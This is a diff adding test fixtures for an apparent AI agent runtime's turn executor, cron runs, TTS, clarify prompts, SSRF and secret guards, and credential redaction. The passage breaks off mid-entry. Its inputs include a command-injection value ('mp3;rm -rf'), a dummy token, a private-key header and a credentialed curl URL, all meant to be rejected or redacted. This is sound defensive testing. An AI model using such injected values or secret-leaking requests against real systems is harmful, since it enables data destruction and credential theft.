@@ -250,6 +250,89 @@
    :known-catalog #{"hermes-cli" "hermes-cron"}
    :expect {:status :refused :reason "toolset/unknown" :unknown ["nope-x"]}}
 
+  ;; ------------------------------------------------------------ turn-exec
+  {:id :turn-exec/ok-single :op :turn-exec
+   :plan {:status :ok :exec [{:id "inference"}]}
+   :expect {:status :done :ran 1 :stub-calls 1
+            :steps [{:id "inference" :index 0 :result {:status :ok :id "inference"}}]}}
+  {:id :turn-exec/ok-multi :op :turn-exec
+   :plan {:status :ok :exec [{:id "a"} {:id "b"} {:id "c"}]}
+   :expect {:status :done :ran 3 :stub-calls 3
+            :steps [{:id "a" :index 0 :result {:status :ok :id "a"}}
+                    {:id "b" :index 1 :result {:status :ok :id "b"}}
+                    {:id "c" :index 2 :result {:status :ok :id "c"}}]}}
+  {:id :turn-exec/held-passthrough :op :turn-exec :via "throw"
+   :plan {:status :held :reason "authority/needs-owner" :exec [{:id "inference"}]}
+   :expect {:status :held :reason "authority/needs-owner" :ran 0 :stub-calls 0 :steps []}}
+  {:id :turn-exec/refused-passthrough :op :turn-exec
+   :plan {:status :refused :reason "turn/empty-prompt" :exec [{:id "inference"}]}
+   :expect {:status :refused :reason "turn/empty-prompt" :ran 0 :stub-calls 0 :steps []}}
+  {:id :turn-exec/empty-exec :op :turn-exec
+   :plan {:status :ok :exec []}
+   :expect {:status :done :ran 0 :stub-calls 0 :steps []}}
+  {:id :turn-exec/fail-mid :op :turn-exec :via "fail-1"
+   :plan {:status :ok :exec [{:id "a"} {:id "b"} {:id "c"}]}
+   :expect {:status :failed :reason "turn/step-failed" :failed-step "b" :ran 2 :stub-calls 2
+            :steps [{:id "a" :index 0 :result {:status :ok :id "a"}}
+                    {:id "b" :index 1 :result {:status :failed :reason "turn/step-failed" :id "b"}}]}}
+  {:id :turn-exec/unknown-step :op :turn-exec :via "unknown"
+   :plan {:status :ok :exec [{:id "a"}]}
+   :expect {:status :failed :reason "turn/unknown-step" :failed-step "a" :ran 1 :stub-calls 0
+            :steps [{:id "a" :index 0 :result {:status :unknown :id "a"}}]}}
+  {:id :turn-exec/bad-result :op :turn-exec :via "bad"
+   :plan {:status :ok :exec [{:id "a"}]}
+   :expect {:status :failed :reason "turn/bad-result" :failed-step "a" :ran 0 :stub-calls 0 :steps []}}
+  {:id :turn-exec/throws :op :turn-exec :via "throw"
+   :plan {:status :ok :exec [{:id "a"}]}
+   :expect {:status :failed :reason "turn/step-threw" :failed-step "a" :ran 1 :stub-calls 1
+            :steps [{:id "a" :index 0
+                     :result {:status :threw :reason "turn/step-threw"
+                              :error "turn-exec: stub threw"}}]}}
+  {:id :turn-exec/bad-plan :op :turn-exec
+   :expect {:status :failed :reason "turn/bad-plan" :ran 0 :stub-calls 0 :steps []}}
+  {:id :turn-exec/bad-step :op :turn-exec
+   :plan {:status :ok :exec [{:id "a"} {:kind "no-id"}]}
+   :expect {:status :failed :reason "turn/bad-step" :ran 1 :stub-calls 1 :failed-step 1
+            :steps [{:id "a" :index 0 :result {:status :ok :id "a"}}]}}
+  {:id :neg/turn-exec-bad-exec :negative true :op :turn-exec
+   :plan {:status :ok :exec {:id "a"}}
+   :expect {:status :failed :reason "turn/bad-exec" :ran 0 :stub-calls 0 :steps []}}
+  {:id :turn-exec/render-done :op :turn-exec :render true
+   :prompt "hi" :run-at "2026-11-09T12:00:00Z"
+   :plan {:status :ok :exec [{:id "a"} {:id "b"}]}
+   :expect {:rendered "# Ad-hoc Turn\n\n**Status:** done\n**Ran:** 2 step(s)\n**Run Time:** 2026-11-09T12:00:00Z\n\n## Prompt\n\nhi\n\n## Steps\n\n- [0] a: ok\n- [1] b: ok"}}
+  {:id :turn-exec/render-failed :op :turn-exec :render true :via "fail-1"
+   :prompt "hi" :run-at "2026-11-09T12:00:00Z"
+   :plan {:status :ok :exec [{:id "a"} {:id "b"}]}
+   :expect {:rendered "# Ad-hoc Turn (FAILED)\n\n**Status:** failed\n**Reason:** turn/step-failed\n**Failed step:** b\n**Ran:** 2 step(s)\n**Run Time:** 2026-11-09T12:00:00Z\n\n## Prompt\n\nhi\n\n## Steps\n\n- [0] a: ok\n- [1] b: failed"}}
+  {:id :turn-exec/render-held :op :turn-exec :render true
+   :prompt "hi" :run-at "2026-11-09T12:00:00Z"
+   :plan {:status :held :reason "authority/needs-owner" :exec [{:id "inference"}]}
+   :expect {:rendered "# Ad-hoc Turn\n\n**Status:** held\n**Reason:** authority/needs-owner\n**Ran:** 0 step(s)\n**Run Time:** 2026-11-09T12:00:00Z\n\n## Prompt\n\nhi\n\n(no steps ran)\n"}}
+  {:id :turn-exec/fold-done :op :turn-exec :fold true
+   :plan {:status :ok :exec [{:id "a"} {:id "b"}]}
+   :expect {:turn {:id "b"}}}
+  {:id :turn-exec/fold-failed :op :turn-exec :fold true :via "fail-1"
+   :plan {:status :ok :exec [{:id "a"} {:id "b"}]}
+   :expect {:turn {:final "[CRON_FAILURE] turn/step-failed (step b)"
+                   :exit-reason "turn/step-failed"
+                   :error {:error "turn/step-failed"}}}}
+  {:id :turn-exec/fold-throw :op :turn-exec :fold true :via "throw"
+   :plan {:status :ok :exec [{:id "a"}]}
+   :expect {:turn {:final "[CRON_FAILURE] turn/step-threw (step a)"
+                   :exit-reason "turn/step-threw"
+                   :error {:error "turn/step-threw"}}}}
+  {:id :turn-exec/fold-held :op :turn-exec :fold true
+   :plan {:status :held :reason "authority/needs-owner" :exec [{:id "inference"}]}
+   :expect {:turn {:final "[CRON_FAILURE] authority/needs-owner"
+                   :exit-reason "authority/needs-owner"
+                   :error {:error "authority/needs-owner"}}}}
+  {:id :turn-exec/fold-empty :op :turn-exec :fold true
+   :plan {:status :ok :exec []}
+   :expect {:turn {:final "[CRON_FAILURE] turn/empty-transcript"
+                   :exit-reason "turn/empty-transcript"
+                   :error {:error "turn/empty-transcript"}}}}
+
   ;; ------------------------------------------------------------ run-plan
   {:id :run-plan/pending-script :op :run-plan :profile "itonami-ok" :job "digest-tick"
    :capabilities [:read_source]
@@ -985,6 +1068,50 @@
             :job-after {"last_status" "ok" "last_delivery_error" nil}
             :usage-row {"job_id" "agent12" "deliver_target" "telegram" "delivery_error" nil}
             :run-row {"job_id" "agent12" "status" "ok"}}}
+  {:id :run/step-ok :op :run
+   :seed {"config.yaml" "model:\n  default: mishima\n  provider: murakumo\n  base_url: https://api.murakumo.cloud/v1\n"
+          "itonami.edn" "{:itonami/schema \"cloud.itonami.profile.v2\" :profile/id \"run-step-ok\" :profile/hermes-compatible true :runtime {:engine :itonami-agent :scheduler :itonami} :placement {:mode :local :order [:local] :inference-rail :murakumo} :inference {:rails [:murakumo] :authorities [\"api.murakumo.cloud\"] :deny-hosts [\"openrouter.ai\"]} :state {} :bundle {:cid \"bafkreix\" :files 1} :capabilities [] :cron? true}"
+          "cron/jobs.json" "{\"jobs\": [{\"id\": \"step-ok\", \"name\": \"step-ok\", \"enabled\": true, \"state\": \"scheduled\", \"next_run_at\": \"2026-11-08T01:00:00+09:00\", \"script\": \"hello.sh\", \"prompt\": \"do the thing\", \"schedule\": {\"kind\": \"interval\", \"minutes\": 60, \"display\": \"every 60m\"}}]}"
+          "scripts/hello.sh" "#!/bin/sh\necho hi\n"}
+   :request {:job "step-ok" :step "ok"}
+   :expect {:exit 0 :status "ok" :lines ["ran step-ok: ok"]
+            :needles ["live did it" "## Script Output" "hi" "do the thing"]
+            :doc-has {"live did it" true "## Script Output" true "hi" true "do the thing" true}
+            :job-after {"last_status" "ok" "last_error" nil "failure_streak" 0 "repeat" {"completed" 1}}
+            :usage-row {"job_id" "step-ok" "response_silent" false "deliver_target" "local" "delivery_error" nil "model" "mishima" "prompt_tokens" 10 "completion_tokens" 20 "total_tokens" 30 "error" nil "engine" "itonami-agent" "ts" "2026-11-08T00:00:00.000000+09:00"}
+            :run-row {"job_id" "step-ok" "manual" true "status" "ok" "exit_reason" "completed" "turns" 1 "provider" "murakumo" "model" "mishima" "ts" "2026-11-08T00:00:00.000000+09:00"}}}
+  {:id :run/step-fail :op :run
+   :seed {"config.yaml" "model:\n  default: mishima\n  provider: murakumo\n  base_url: https://api.murakumo.cloud/v1\n"
+          "itonami.edn" "{:itonami/schema \"cloud.itonami.profile.v2\" :profile/id \"run-step-fail\" :profile/hermes-compatible true :runtime {:engine :itonami-agent :scheduler :itonami} :placement {:mode :local :order [:local] :inference-rail :murakumo} :inference {:rails [:murakumo] :authorities [\"api.murakumo.cloud\"] :deny-hosts [\"openrouter.ai\"]} :state {} :bundle {:cid \"bafkreix\" :files 1} :capabilities [] :cron? true}"
+          "cron/jobs.json" "{\"jobs\": [{\"id\": \"step-fail\", \"name\": \"step-fail\", \"enabled\": true, \"state\": \"scheduled\", \"next_run_at\": \"2026-11-08T01:00:00+09:00\", \"prompt\": \"run the step\", \"schedule\": {\"kind\": \"interval\", \"minutes\": 60, \"display\": \"every 60m\"}}]}"}
+   :request {:job "step-fail" :step "fail"}
+   :expect {:exit 1 :status "error" :lines ["ran step-fail: error"]
+            :needles ["[CRON_FAILURE] rail/unavailable (step inference)" "## Error" "rail/unavailable" "run the step"]
+            :doc-has {"[CRON_FAILURE] rail/unavailable (step inference)" true "## Error" true "rail/unavailable" true "run the step" true}
+            :job-after {"last_status" "error" "last_error" "rail/unavailable" "failure_streak" 1}
+            :usage-row {"job_id" "step-fail" "response_silent" false "error" "rail/unavailable" "deliver_target" "local"}
+            :run-row {"job_id" "step-fail" "status" "error" "exit_reason" "rail/unavailable"}}}
+  {:id :run/step-throw :op :run
+   :seed {"config.yaml" "model:\n  default: mishima\n  provider: murakumo\n  base_url: https://api.murakumo.cloud/v1\n"
+          "itonami.edn" "{:itonami/schema \"cloud.itonami.profile.v2\" :profile/id \"run-step-throw\" :profile/hermes-compatible true :runtime {:engine :itonami-agent :scheduler :itonami} :placement {:mode :local :order [:local] :inference-rail :murakumo} :inference {:rails [:murakumo] :authorities [\"api.murakumo.cloud\"] :deny-hosts [\"openrouter.ai\"]} :state {} :bundle {:cid \"bafkreix\" :files 1} :capabilities [] :cron? true}"
+          "cron/jobs.json" "{\"jobs\": [{\"id\": \"step-throw\", \"name\": \"step-throw\", \"enabled\": true, \"state\": \"scheduled\", \"next_run_at\": \"2026-11-08T01:00:00+09:00\", \"prompt\": \"run the step\", \"schedule\": {\"kind\": \"interval\", \"minutes\": 60, \"display\": \"every 60m\"}}]}"}
+   :request {:job "step-throw" :step "throw"}
+   :expect {:exit 1 :status "error" :lines ["ran step-throw: error"]
+            :needles ["[CRON_FAILURE] turn/step-threw (step inference)" "## Error" "turn/step-threw"]
+            :doc-has {"[CRON_FAILURE] turn/step-threw (step inference)" true "## Error" true "turn/step-threw" true}
+            :job-after {"last_status" "error" "last_error" "turn/step-threw" "failure_streak" 1}
+            :usage-row {"job_id" "step-throw" "error" "turn/step-threw"}
+            :run-row {"job_id" "step-throw" "status" "error" "exit_reason" "turn/step-threw"}}}
+  {:id :run/step-bad :op :run
+   :seed {"config.yaml" "model:\n  default: mishima\n  provider: murakumo\n  base_url: https://api.murakumo.cloud/v1\n"
+          "itonami.edn" "{:itonami/schema \"cloud.itonami.profile.v2\" :profile/id \"run-step-bad\" :profile/hermes-compatible true :runtime {:engine :itonami-agent :scheduler :itonami} :placement {:mode :local :order [:local] :inference-rail :murakumo} :inference {:rails [:murakumo] :authorities [\"api.murakumo.cloud\"] :deny-hosts [\"openrouter.ai\"]} :state {} :bundle {:cid \"bafkreix\" :files 1} :capabilities [] :cron? true}"
+          "cron/jobs.json" "{\"jobs\": [{\"id\": \"step-bad\", \"name\": \"step-bad\", \"enabled\": true, \"state\": \"scheduled\", \"next_run_at\": \"2026-11-08T01:00:00+09:00\", \"prompt\": \"run the step\", \"schedule\": {\"kind\": \"interval\", \"minutes\": 60, \"display\": \"every 60m\"}}]}"}
+   :request {:job "step-bad" :step "bad"}
+   :expect {:exit 1 :status "error" :lines ["ran step-bad: error"]
+            :needles ["[CRON_FAILURE] turn/bad-result (step inference)"]
+            :doc-has {"[CRON_FAILURE] turn/bad-result (step inference)" true}
+            :job-after {"last_status" "error" "last_error" "turn/bad-result"}
+            :run-row {"job_id" "step-bad" "status" "error" "exit_reason" "turn/bad-result"}}}
   {:id :doctor-ok :op :doctor
    :seed {"profiles/p1/itonami.edn" "{:profile/id \"doc-ok\"}"
           "profiles/p1/config.yaml" "model:\n  default: mishima\n"
@@ -3067,4 +3194,1053 @@ Output since last heartbeat:
   {:id :turn-asm/spellings :op :turn-asm
    :call ["spellings"]
    :expect {:value ["-1" "0" "inf" "infinite" "infinity" "none" "null" "unlimited" "∞"]}}
+
+  ;; ------------------------------------------------------------ tts (S6b)
+  {:id :tts/configured-full :op :tts
+   :call ["configured" {"tts" {"provider" "murakumo" "model" "m" "voice" "v"}}]
+   :expect {:value {:provider "murakumo" :model "m" :voice "v"}}}
+  {:id :tts/configured-default-voice :op :tts
+   :call ["configured" {"tts" {"provider" "murakumo" "model" "m"}}]
+   :expect {:value {:provider "murakumo" :model "m" :voice "alloy"}}}
+  {:id :tts/configured-no-provider :op :tts
+   :call ["configured" {"tts" {"model" "m" "voice" "v"}}]
+   :expect {:value nil}}
+  {:id :tts/configured-no-model :op :tts
+   :call ["configured" {"tts" {"provider" "murakumo"}}]
+   :expect {:value nil}}
+  {:id :tts/request-full :op :tts
+   :call ["request" {:base-url "https://h/v1" :headers {"X" "y"} :token "t" :model "m"} "alloy" "hi" "mp3"]
+   :expect {:value {:url "https://h/v1/audio/speech"
+                    :headers {"X" "y" "Content-Type" "application/json" "Authorization" "Bearer t"}
+                    :body "{\"input\":\"hi\",\"model\":\"m\",\"response_format\":\"mp3\",\"voice\":\"alloy\"}"}}}
+  {:id :tts/request-no-token :op :tts
+   :call ["request" {:base-url "https://h/v1" :model "m"} "alloy" "hi" "wav"]
+   :expect {:value {:url "https://h/v1/audio/speech"
+                    :headers {"Content-Type" "application/json"}
+                    :body "{\"input\":\"hi\",\"model\":\"m\",\"response_format\":\"wav\",\"voice\":\"alloy\"}"}}}
+  {:id :tts/format-ok :op :tts
+   :call ["format" "mp3"]
+   :expect {:value "mp3"}}
+  {:id :tts/format-upper-kept :op :tts
+   :call ["format" "MP3"]
+   :expect {:value "MP3"}}
+  {:id :tts/format-bad :op :tts
+   :call ["format" "mp3;rm -rf"]
+   :expect {:value nil}}
+  {:id :tts/format-empty :op :tts
+   :call ["format" ""]
+   :expect {:value nil}}
+  {:id :tts/timeout-num :op :tts
+   :call ["timeout" 5]
+   :expect {:value 5}}
+  {:id :tts/timeout-zero-falls-to-cap :op :tts
+   :call ["timeout" 0]
+   :expect {:value 600}}
+  {:id :tts/timeout-over-cap :op :tts
+   :call ["timeout" 1000]
+   :expect {:value 600}}
+  {:id :tts/timeout-string :op :tts
+   :call ["timeout" "20.5"]
+   :expect {:value 20.5}}
+  {:id :tts/timeout-garbage-falls-to-cap :op :tts
+   :call ["timeout" "abc"]
+   :expect {:value 600}}
+
+  ;; ------------------------------------------------------------ collect (S6b)
+  {:id :collect/row-ok :op :collect
+   :call ["row" {:id "r1" :kind "k" :canonical "c1" :status "pending"}]
+   :expect {:value {:ok true
+                    :row {:id "r1" :kind "k" :canonical "c1" :status "done"
+                          :transfer-id "t1" :signed-by ["tester"]
+                          :appended-at "2026-11-09T00:00:00+09:00"}}}}
+  {:id :collect/row-not-pending :op :collect
+   :call ["row" {:id "r1" :kind "k" :canonical "c1" :status "done"}]
+   :expect {:value {:ok false :reason :not-pending}}}
+  {:id :collect/row-bad-id :op :collect
+   :call ["row" {:kind "k" :canonical "c1" :status "pending"}]
+   :expect {:value {:ok false :reason :bad-id}}}
+  {:id :collect/row-bad-canonical :op :collect
+   :call ["row" {:id "r1" :kind "k" :canonical "" :status "pending"}]
+   :expect {:value {:ok false :reason :bad-canonical}}}
+  {:id :collect/row-no-signature :op :collect
+   :call ["row" {:id "r1" :kind "k" :canonical "c1" :status "pending"} "no-sig"]
+   :expect {:value {:ok false :reason :no-signature}}}
+  {:id :collect/row-no-receipt :op :collect
+   :call ["row" {:id "r1" :kind "k" :canonical "c1" :status "pending"} "no-receipt"]
+   :expect {:value {:ok false :reason :no-receipt}}}
+  {:id :collect/row-throw :op :collect
+   :call ["row" {:id "r1" :kind "k" :canonical "c1" :status "pending"} "throw"]
+   :expect {:value {:ok false :reason :append-failed :detail "collect: stub threw"}}}
+  {:id :collect/row-bare-receipt :op :collect
+   :call ["row" {:id "r1" :kind "k" :canonical "c1" :status "pending"} "bare-receipt"]
+   :expect {:value {:ok true
+                    :row {:id "r1" :kind "k" :canonical "c1" :status "done"
+                          :transfer-id "t1" :signed-by ["unknown"]
+                          :appended-at nil}}}}
+  {:id :collect/certify-mixed :op :collect
+   :call ["certify" [{:id "r1" :kind "k" :canonical "c1" :status "pending"}
+                     {:id "r2" :kind "k" :canonical "c2" :status "done"}]]
+   :expect {:value {:rows [{:id "r1" :kind "k" :canonical "c1" :status "done"
+                            :transfer-id "t1" :signed-by ["tester"]
+                            :appended-at "2026-11-09T00:00:00+09:00"}
+                           {:id "r2" :kind "k" :canonical "c2" :status "done"}]
+                    :refusals [{:id "r2" :reason :not-pending}]}}}
+  {:id :collect/reconcile-clean :op :collect
+   :call ["reconcile" [{:id "a" :status "done" :canonical "c" :transfer-id "t"}]
+          [{:id "a" :canonical "c" :transfer-id "t"}]]
+   :expect {:value []}}
+  {:id :collect/reconcile-problems :op :collect
+   :call ["reconcile" [{:id "a" :status "pending" :canonical "c" :transfer-id "t"}
+                       {:id "b" :status "done" :canonical "c" :transfer-id "t"}]
+          [{:id "z" :canonical "x" :transfer-id "y"}
+           {:id "b" :canonical "WRONG" :transfer-id "t"}
+           {:id "b" :canonical "c" :transfer-id "WRONG"}]]
+   :expect {:value [{:id "a" :refusal :still-pending}
+                    {:id "z" :refusal :appended-but-unknown}
+                    {:id "b" :refusal :canonical-mismatch}
+                    {:id "b" :refusal :receipt-mismatch}]}}
+
+  ;; ------------------------------------------------------------ clarify (S6b)
+  {:id :clarify/strip-label :op :clarify
+   :call ["strip" "Ship it (Recommended)"]
+   :expect {:value "Ship it"}}
+  {:id :clarify/strip-lower :op :clarify
+   :call ["strip" "Go (recommended)"]
+   :expect {:value "Go"}}
+  {:id :clarify/strip-plain :op :clarify
+   :call ["strip" "Maybe"]
+   :expect {:value "Maybe"}}
+  {:id :clarify/mark-first :op :clarify
+   :call ["mark" ["a" "b"]]
+   :expect {:value ["a (Recommended)" "b"]}}
+  {:id :clarify/mark-single-untouched :op :clarify
+   :call ["mark" ["a"]]
+   :expect {:value ["a"]}}
+  {:id :clarify/mark-idempotent :op :clarify
+   :call ["mark" ["a (Recommended)" "b"]]
+   :expect {:value ["a (Recommended)" "b"]}}
+  {:id :clarify/clean-single :op :clarify
+   :call ["clean" "x (Recommended)" false]
+   :expect {:value "x"}}
+  {:id :clarify/clean-multi :op :clarify
+   :call ["clean" "[\"a (Recommended)\", \" \", \"b\"]" true]
+   :expect {:value ["a" "b"]}}
+  {:id :clarify/normalize-valid :op :clarify
+   :call ["normalize" [{"question" "Pick?" "choices" ["a" "b"]}]]
+   :expect {:value [[{"qid" "q0" "question" "Pick?"
+                      "choices" ["a (Recommended)" "b"]
+                      "choices_offered" ["a" "b"]
+                      "multi_select" false}] nil]}}
+  {:id :clarify/normalize-blank-question :op :clarify
+   :call ["normalize" [{"question" "  "}]]
+   :expect {:value [nil "questions[0].question must be non-empty text."]}}
+  {:id :clarify/normalize-too-many :op :clarify
+   :call ["normalize" [{"question" "Q?"} {"question" "Q?"} {"question" "Q?"}
+                        {"question" "Q?"} {"question" "Q?"} {"question" "Q?"}]]
+   :expect {:value [nil "questions supports at most 5 items."]}}
+  {:id :clarify/status-answered :op :clarify
+   :call ["status" "q0" {"q0" "yes"} false]
+   :expect {:value ["answered" "yes"]}}
+  {:id :clarify/status-skipped :op :clarify
+   :call ["status" "q0" {"q0" ""} false]
+   :expect {:value ["skipped" nil]}}
+  {:id :clarify/status-unanswered :op :clarify
+   :call ["status" "q0" {} false]
+   :expect {:value ["unanswered" nil]}}
+  {:id :clarify/result-answered :op :clarify
+   :call ["result" [{"qid" "q0" "question" "Pick?"
+                     "choices" ["a (Recommended)" "b"]
+                     "choices_offered" ["a" "b"]
+                     "multi_select" false}]
+          {"outcome" "answered" "answers" {"q0" "a"}}]
+   :expect {:value "{\"outcome\":\"answered\",\"responses\":[{\"choices_offered\":[\"a\",\"b\"],\"question\":\"Pick?\",\"status\":\"answered\",\"user_response\":\"a\"}]}"}}
+  ;; ------------------------------------------------------------ webguard (S6b)
+  {:id :webguard/blocked-loopback :op :webguard
+   :call ["blocked" 4 "127.0.0.1"]
+   :expect {:value true}}
+  {:id :webguard/blocked-private10 :op :webguard
+   :call ["blocked" 4 "10.1.2.3"]
+   :expect {:value true}}
+  {:id :webguard/blocked-net172 :op :webguard
+   :call ["blocked" 4 "172.20.0.1"]
+   :expect {:value true}}
+  {:id :webguard/allowed-net172-outside :op :webguard
+   :call ["blocked" 4 "172.32.0.1"]
+   :expect {:value false}}
+  {:id :webguard/blocked-cnet :op :webguard
+   :call ["blocked" 4 "192.168.1.1"]
+   :expect {:value true}}
+  {:id :webguard/allowed-public :op :webguard
+   :call ["blocked" 4 "8.8.8.8"]
+   :expect {:value false}}
+  {:id :webguard/blocked-zero :op :webguard
+   :call ["blocked" 4 "0.0.0.0"]
+   :expect {:value true}}
+  {:id :webguard/blocked-v6-loopback :op :webguard
+   :call ["blocked" 6 "::1"]
+   :expect {:value true}}
+  {:id :webguard/allowed-v6-public :op :webguard
+   :call ["blocked" 6 "2001:4860:4860::8888"]
+   :expect {:value false}}
+  {:id :webguard/blocked-v6-ula :op :webguard
+   :call ["blocked" 6 "fc00::1"]
+   :expect {:value true}}
+  {:id :webguard/blocked-unknown-kind :op :webguard
+   :call ["blocked" 7 "8.8.8.8"]
+   :expect {:value true}}
+  {:id :webguard/blocked-nil-kind :op :webguard
+   :call ["blocked" nil "8.8.8.8"]
+   :expect {:value true}}
+  {:id :webguard/allowed-nil-allow :op :webguard
+   :call ["allowed" nil "anything.example"]
+   :expect {:value true}}
+  {:id :webguard/allowed-exact :op :webguard
+   :call ["allowed" ["a.example"] "a.example"]
+   :expect {:value true}}
+  {:id :webguard/allowed-exact-miss :op :webguard
+   :call ["allowed" ["a.example"] "b.example"]
+   :expect {:value false}}
+  {:id :webguard/allowed-wildcard :op :webguard
+   :call ["allowed" ["*.example"] "x.example"]
+   :expect {:value true}}
+  {:id :webguard/allowed-wildcard-apex :op :webguard
+   :call ["allowed" ["*.example"] "example"]
+   :expect {:value false}}
+  {:id :webguard/allowed-case-fold :op :webguard
+   :call ["allowed" ["A.Example"] "a.example"]
+   :expect {:value true}}
+  {:id :webguard/refusal-empty :op :webguard
+   :call ["refusal" ""]
+   :expect {:value :empty-query}}
+  {:id :webguard/refusal-too-long :op :webguard
+   :call ["refusal" "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"]
+   :expect {:value :query-too-long}}
+  {:id :webguard/refusal-secret :op :webguard
+   :call ["refusal" "key is ghp_abcdefghij1234567890 ok"]
+   :expect {:value :secret}}
+  {:id :webguard/refusal-private-key :op :webguard
+   :call ["refusal" "-----BEGIN PRIVATE KEY-----"]
+   :expect {:value :secret}}
+  {:id :webguard/refusal-email :op :webguard
+   :call ["refusal" "mail me at user@example.com"]
+   :expect {:value :email}}
+  {:id :webguard/refusal-blob :op :webguard
+   :call ["refusal" "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqr"]
+   :expect {:value :encoded-blob}}
+  {:id :webguard/refusal-phone :op :webguard
+   :call ["refusal" "call +1 650-555-1234"]
+   :expect {:value :phone}}
+  {:id :webguard/refusal-clean :op :webguard
+   :call ["refusal" "what is the weather"]
+   :expect {:value nil}}
+
+  ;; ------------------------------------------------------------ process (redact)
+  {:id :process/redact-url :op :process
+   :call ["redact" "curl https://user:s3cret@host/x"]
+   :expect {:value "curl https://[redacted]@host/x"}}
+  {:id :process/redact-bearer :op :process
+   :call ["redact" "tok Bearer abcDEF123 end"]
+   :expect {:value "tok Bearer [redacted] end"}}
+  {:id :process/redact-bearer-start :op :process
+   :call ["redact" "Bearer abcDEF123"]
+   :expect {:value "Bearer [redacted]"}}
+  {:id :process/redact-bearer-case :op :process
+   :call ["redact" "tok bearer abcDEF123 end"]
+   :expect {:value "tok Bearer [redacted] end"}}
+  {:id :process/redact-password :op :process
+   :call ["redact" "login password=hunter2 done"]
+   :expect {:value "login password=[redacted] done"}}
+  {:id :process/redact-query-greedy :op :process
+   :call ["redact" "a=1&api_key=K&b=2"]
+   :expect {:value "a=1&api_key=[redacted]"}}
+  {:id :process/redact-nonboundary-bearer :op :process
+   :call ["redact" "xBearer abcDEF123"]
+   :expect {:value "xBearer abcDEF123"}}
+  {:id :process/redact-clean :op :process
+   :call ["redact" "run the nightly job"]
+   :expect {:value "run the nightly job"}}
+
+  ;; ------------------------------------------------------------ dapps (S6b-2)
+  {:id :dapps/unconfigured :op :dapps
+   :call ["status"]
+   :request {:env {}}
+   :expect {:rows [{"server" "mihari" "entry" "mcp/mihari"
+                    "title" "mihari — Sentry-compatible error grouping and triage rules"
+                    "registry" "cloud-itonami/itonami-registry@422e10b3fe6f"
+                    "source" "cloud-itonami/app-itonami-mihari@8f2ec46a2791"
+                    "placeholder" "MIHARI_REPO"
+                    "error" "itonami_dapps: no cloud-itonami/app-itonami-mihari checkout found; set MIHARI_REPO to its absolute path"}
+                   {"server" "dandori" "entry" "mcp/dandori"
+                    "title" "dandori — Linear-compatible export conversion and planning checks"
+                    "registry" "cloud-itonami/itonami-registry@422e10b3fe6f"
+                    "source" "cloud-itonami/app-itonami-dandori@dbe623ba5b10"
+                    "placeholder" "DANDORI_REPO"
+                    "error" "itonami_dapps: no cloud-itonami/app-itonami-dandori checkout found; set DANDORI_REPO to its absolute path"}]}}
+  {:id :dapps/resolved-one :op :dapps
+   :call ["status"]
+   :request {:env {"MIHARI_REPO" "test/scratch/dapps-resolved-one/mihari"}}
+   :seed {"mihari/bin/mihari-mcp" "#!/bin/sh\n"}
+   :expect {:rows [{"server" "mihari" "entry" "mcp/mihari"
+                    "title" "mihari — Sentry-compatible error grouping and triage rules"
+                    "registry" "cloud-itonami/itonami-registry@422e10b3fe6f"
+                    "source" "cloud-itonami/app-itonami-mihari@8f2ec46a2791"
+                    "placeholder" "MIHARI_REPO"
+                    "launcher" "test/scratch/dapps-resolved-one/mihari/bin/mihari-mcp"
+                    "resolved_from" "MIHARI_REPO"}
+                   {"server" "dandori" "entry" "mcp/dandori"
+                    "title" "dandori — Linear-compatible export conversion and planning checks"
+                    "registry" "cloud-itonami/itonami-registry@422e10b3fe6f"
+                    "source" "cloud-itonami/app-itonami-dandori@dbe623ba5b10"
+                    "placeholder" "DANDORI_REPO"
+                    "error" "itonami_dapps: no cloud-itonami/app-itonami-dandori checkout found; set DANDORI_REPO to its absolute path"}]}}
+  {:id :dapps/explicit-bad :op :dapps
+   :call ["status"]
+   :request {:env {"MIHARI_REPO" "test/scratch/dapps-explicit-bad/nowhere"}}
+   :expect {:rows [{"server" "mihari" "entry" "mcp/mihari"
+                    "title" "mihari — Sentry-compatible error grouping and triage rules"
+                    "registry" "cloud-itonami/itonami-registry@422e10b3fe6f"
+                    "source" "cloud-itonami/app-itonami-mihari@8f2ec46a2791"
+                    "placeholder" "MIHARI_REPO"
+                    "error" "itonami_dapps: MIHARI_REPO=test/scratch/dapps-explicit-bad/nowhere has no bin/mihari-mcp"}
+                   {"server" "dandori" "entry" "mcp/dandori"
+                    "title" "dandori — Linear-compatible export conversion and planning checks"
+                    "registry" "cloud-itonami/itonami-registry@422e10b3fe6f"
+                    "source" "cloud-itonami/app-itonami-dandori@dbe623ba5b10"
+                    "placeholder" "DANDORI_REPO"
+                    "error" "itonami_dapps: no cloud-itonami/app-itonami-dandori checkout found; set DANDORI_REPO to its absolute path"}]}}
+  {:id :dapps/tilde-home :op :dapps
+   :call ["status"]
+   :request {:env {"MIHARI_REPO" "~/mihari" "HOME" "test/scratch/dapps-tilde-home/home"}}
+   :seed {"home/mihari/bin/mihari-mcp" "#!/bin/sh\n"}
+   :expect {:rows [{"server" "mihari" "entry" "mcp/mihari"
+                    "title" "mihari — Sentry-compatible error grouping and triage rules"
+                    "registry" "cloud-itonami/itonami-registry@422e10b3fe6f"
+                    "source" "cloud-itonami/app-itonami-mihari@8f2ec46a2791"
+                    "placeholder" "MIHARI_REPO"
+                    "launcher" "test/scratch/dapps-tilde-home/home/mihari/bin/mihari-mcp"
+                    "resolved_from" "MIHARI_REPO"}
+                   {"server" "dandori" "entry" "mcp/dandori"
+                    "title" "dandori — Linear-compatible export conversion and planning checks"
+                    "registry" "cloud-itonami/itonami-registry@422e10b3fe6f"
+                    "source" "cloud-itonami/app-itonami-dandori@dbe623ba5b10"
+                    "placeholder" "DANDORI_REPO"
+                    "error" "itonami_dapps: no cloud-itonami/app-itonami-dandori checkout found; set DANDORI_REPO to its absolute path"}]}}
+  ;; ------------------------------------------------------------ connections (S6b-2)
+  {:id :connections/store-name-basic :op :connections
+   :call ["store-name" "a b/c"]
+   :expect {:value "a_b_c"}}
+  {:id :connections/store-name-truncates :op :connections
